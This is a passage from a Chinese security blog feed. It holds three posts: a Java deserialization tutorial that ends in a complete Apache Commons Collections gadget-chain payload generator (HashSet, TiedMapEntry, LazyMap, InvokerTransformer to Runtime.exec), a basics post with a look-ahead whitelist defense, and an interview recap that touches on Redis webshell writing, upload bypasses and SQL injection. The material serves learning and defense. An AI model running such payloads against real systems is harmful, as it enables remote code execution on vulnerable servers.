class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadLazyMap</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">"nonce"</span>);</span><br><span class="line">Field hashSetMapField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">hashSetMapField = HashSet.class.getDeclaredField("map");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">hashSetMapField = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hashSetMapField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap innerHashMap = (HashMap) hashSetMapField.get(hashSet);</span><br><span class="line"></span><br><span class="line">Field hashMapTableField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">hashMapTableField = HashMap.class.getDeclaredField("table");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">hashMapTableField = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hashMapTableField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) hashMapTableField.get(innerHashMap);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">out.writeObject(hashSet);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">         payloadTest();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化后弹出计算器，说明我们POP构造成功</p><h2 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h2><p>它的POP链为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>先看HashSet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> </span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT); <span class="comment">//Notice this</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它内部存在一个HashMap，因为HashSet本身的实现原理就是利用HashMap，在新元素e加入Set时，实际上在HashMap中保存<hash(e), e>。</hash(e),></p><p>在反序列化的时候，同样也会将对象加入这个HashMap，我们需要利用的就是<code>map.put(e, PRESENT)</code>这句话，在调试时，可以看到e对象是一个TiedMapEntry对象，key=foo，value=ProcessImpl：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224558228.png" alt="1546224558228"></p><p>key很好理解，但是value为什么是ProcessImpl？这还要再向下看：</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap.put()调用了hash方法：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546224687897.png" alt="1546224687897"></p><p>hash方法调用了key.hashCode()方法，根据Gadgets链可以猜测我们的key.hashCode()实际上是TiedMapEntry.hashCode()：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546225603303.png" alt="1546225603303"></p><h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><p>继续跟进，就到了TiedMapEntry的hashCode()方法了，简单介绍一下TiedMapEntry，它继承了普通的Entity类（就是高级for循环用到的那个），其构造方法是<code>TiedMapEntry(Map&lt;K,V&gt; map, K key)</code>。</p><p>这里需要利用它的hashCode()方法：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226115263.png" alt="1546226115263"></p><p>以及其调用的getValue()方法，可以看到它实际调用的是LazyMap.get()方法：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546226273203.png" alt="1546226273203"></p><h3 id="org-apache-commons-collections-keyvalue-LazyMap"><a href="#org-apache-commons-collections-keyvalue-LazyMap" class="headerlink" title="org.apache.commons.collections.keyvalue.LazyMap"></a>org.apache.commons.collections.keyvalue.LazyMap</h3><p>终于！！！我们到了链的最底端，LazyMap.get()，LazyMap基于Map，Map一开始不放元素，只有在get()时才会通过之前定义的factory添加元素（这里的factory可以使Transformer类型）。我的断点没办法在序列化时捕捉if里面的语句，好像是因为调试器会在调试语句前执行该语句的原因，不过这个在先前文章(<a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">Commons Collections Java反序列化漏洞深入分析</a>)都介绍过，这里写一个demo模拟一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMapDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(函数名，返回值类型)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(函数名，函数参数)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain);</span><br><span class="line">lazyMap.get(<span class="string">'a'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/反序列化-Commons-Collections-Java反序列化漏洞与POP-Gadgets/1546227538067.png" alt="1546227538067"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://security.tencent.com/index.php/blog/msg/97" title="Commons Collections Java反序列化漏洞深入分析," target="_blank" rel="noopener">Commons Collections Java反序列化漏洞深入分析</a></li><li><a href="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" title="JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用" target="_blank" rel="noopener">JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用</a></li><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全-反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化1：基础</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>java反序列化应该算是java web中最有代表性的一类安全性问题了，因为之前面试也被问到过，这两天好好研究一下。</p><h1 id="Demo代码"><a href="#Demo代码" class="headerlink" title="Demo代码"></a>Demo代码</h1><p>参考”Java反序列化漏洞从入门到深入”一文，具体流程为：1）序列化不安全的类（攻击者所要做的）；2）脆弱程序反序列化不安全的类；3）恶意代码被执行。</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"hi"</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的"object"数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        <span class="comment">// AntObjectInputStream ois = new AntObjectInputStream(fis);</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象，反序列化使用readObject获取对象，这里调用了已经被重写的函数</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写ObjectInputStream.readObject()方法，Java会优先调用重写的readObject()方法。</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h1><p>可以看到，VulnSerialize.main()中反序列化一个不安全的类MyObject，该类重写了ObjectInputStream.readObject()(面向对象的多态性)使其弹出计算器，又因为反序列化时，Java会调用ObjectInputStream类的readObject()方法，如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法，因此造成任意代码执行。</p><p><img src="/反序列化-Java反序列化基本原理/1546052977799.png" alt="1546052977799"></p><p>注意一点是我们只能反序列化已知的类，具体来说，如果我们的程序中没有MyObject类，那么反序列化会爆出ClassNotFound异常，这也是反序列化漏洞需要构造POP的根本原因，这个在之后的文章会说。</p><p><img src="/反序列化-Java反序列化基本原理/1546144818685.png" alt="1546144818685"></p><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><p>防御方法在<a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">Java反序列化漏洞从入门到深入</a>一文中介绍了很多种，但是基本原理都是通过白/黑名单对反序列化的类进行控制。这里介绍一种由IBM的研究人员Pierre Ernst在《<a href="https://www.ibm.com/developerworks/library/se-lookahead/" target="_blank" rel="noopener">Look-ahead Java deserialization</a>》中提出的重写ObjectInputStream.resolveClass()对反序列化的类进行白名单/黑名单控制的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化VulnSerialize类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(VulnSerialize<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用AntObjectInputStream反序列化则不会弹出计算器，因为我们只允许反序列化VulnSerialize类：</p><p><img src="/反序列化-Java反序列化基本原理/1546054466567.png" alt="1546054466567"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全-反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>山石网科web安全工程师面试复盘</title>
      <link href="/%E9%9D%A2%E8%AF%95-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"/>
      <url>/%E9%9D%A2%E8%AF%95-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<p>上周无意在BOSS直聘上发了简历，结果山石网科来电话面试。当时晚上八点，我正在回家的地铁上，很冷，又因为第一次面试有点紧张，自己感觉很多问题答得不好，这里尽量回忆面试内容，希望下次能够做好准备。</p><h2 id="Q1：说一下渗透一个网站的具体流程"><a href="#Q1：说一下渗透一个网站的具体流程" class="headerlink" title="Q1：说一下渗透一个网站的具体流程"></a>Q1：说一下渗透一个网站的具体流程</h2><p>首先信息收集，判断网站是否有CDN，接着了解整个网站的工作流程，接着扫描端口，看看有什么弱服务，比如Redis弱口令，接着我会找逻辑漏洞，比如说密码重置。（最重要的OWASP TOP 10居然忘了讲）</p><a id="more"></a><h2 id="Q2：说一下如何绕过CDN"><a href="#Q2：说一下如何绕过CDN" class="headerlink" title="Q2：说一下如何绕过CDN"></a>Q2：说一下如何绕过CDN</h2><p>可以暴力扫描全网；寻找上传服务，抓包；寻找邮件服务，看IP。（应该还有很多的，比如说看DNS历史解析记录）</p><h2 id="Q3：说一下Redis漏洞如何利用"><a href="#Q3：说一下Redis漏洞如何利用" class="headerlink" title="Q3：说一下Redis漏洞如何利用"></a>Q3：说一下Redis漏洞如何利用</h2><p>当时我只说了一个写webshell的，但是如果redis权限够大的话还可以写contrab或是sshkey。</p><h2 id="Q4：说一下对于不同web容器，如何利用文件上传漏洞"><a href="#Q4：说一下对于不同web容器，如何利用文件上传漏洞" class="headerlink" title="Q4：说一下对于不同web容器，如何利用文件上传漏洞"></a>Q4：说一下对于不同web容器，如何利用文件上传漏洞</h2><p>nginx用00或换行截断，IIS用<code>;</code>隔开（忘记讲apache用多重文件名绕过）</p><h2 id="Q5：简要介绍一下盲注"><a href="#Q5：简要介绍一下盲注" class="headerlink" title="Q5：简要介绍一下盲注"></a>Q5：简要介绍一下盲注</h2><p>盲注分为基于时间的盲注和基于bool的盲注，一个是通过等待时间判断一个字符的ascii码，一个是通过返回现象判断字符的ascii码。</p><h2 id="Q6：你在SQL注入时经常用到哪些函数？"><a href="#Q6：你在SQL注入时经常用到哪些函数？" class="headerlink" title="Q6：你在SQL注入时经常用到哪些函数？"></a>Q6：你在SQL注入时经常用到哪些函数？</h2><p>这题目搞得我眼前一黑，我经常用的难道不是UNION SELECT这种操作符么Orz，然后我就讲了length，if，substring，ascii，其他的一时半会实在想不起来。现在想想其实还有很多，比如报错的函数EXTRACTVALUE、连接函数concat等。</p><h2 id="Q7：在注入时遇到WAF怎么办？"><a href="#Q7：在注入时遇到WAF怎么办？" class="headerlink" title="Q7：在注入时遇到WAF怎么办？"></a>Q7：在注入时遇到WAF怎么办？</h2><p>讲了一种利用fuzz绕过安全狗的思路，不知道考官听懂没有T_T</p><h2 id="Q8：了解PHP的文件包含吗？"><a href="#Q8：了解PHP的文件包含吗？" class="headerlink" title="Q8：了解PHP的文件包含吗？"></a>Q8：了解PHP的文件包含吗？</h2><p>不了解。</p><h2 id="Q9：了解反序列化吗？"><a href="#Q9：了解反序列化吗？" class="headerlink" title="Q9：了解反序列化吗？"></a>Q9：了解反序列化吗？</h2><p>不了解。（反序列化真得好好看看，不仅考官问得多，各种语言好像都有着类问题）</p><h2 id="Q10：说一下你印象最深的渗透经历"><a href="#Q10：说一下你印象最深的渗透经历" class="headerlink" title="Q10：说一下你印象最深的渗透经历"></a>Q10：说一下你印象最深的渗透经历</h2><p>这里我感觉答得还可以，讲了一个通过Docker Remote API getshell的经历。</p><h2 id="Q11：既然你谈到了Docker，那么Docker-file的RUN，ENTRYPOINT和CMD有什么区别？"><a href="#Q11：既然你谈到了Docker，那么Docker-file的RUN，ENTRYPOINT和CMD有什么区别？" class="headerlink" title="Q11：既然你谈到了Docker，那么Docker file的RUN，ENTRYPOINT和CMD有什么区别？"></a>Q11：既然你谈到了Docker，那么Docker file的RUN，ENTRYPOINT和CMD有什么区别？</h2><p>docker file的RUN命令只在构建镜像时运行，ENTRYPOINT和CMD命令均在利用镜像实例化容器时运行，在实例化时输入新命令会覆盖掉CMD命令，而若使用ENTRYPOINT命令时，新的命令会作为参数接在ENTRYPOINT命令后面。</p><h2 id="Q12：擅长什么语言"><a href="#Q12：擅长什么语言" class="headerlink" title="Q12：擅长什么语言"></a>Q12：擅长什么语言</h2><p>擅长Python，Java和PHP能看得懂。</p><h2 id="Q13：用Python写过什么项目吗"><a href="#Q13：用Python写过什么项目吗" class="headerlink" title="Q13：用Python写过什么项目吗"></a>Q13：用Python写过什么项目吗</h2><p>用Python写过一个APK安全扫描框架，blablabla…</p><h2 id="Q14：打过CTF吗？说一说比赛经验？"><a href="#Q14：打过CTF吗？说一说比赛经验？" class="headerlink" title="Q14：打过CTF吗？说一说比赛经验？"></a>Q14：打过CTF吗？说一说比赛经验？</h2><p>也就随便说说了。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" 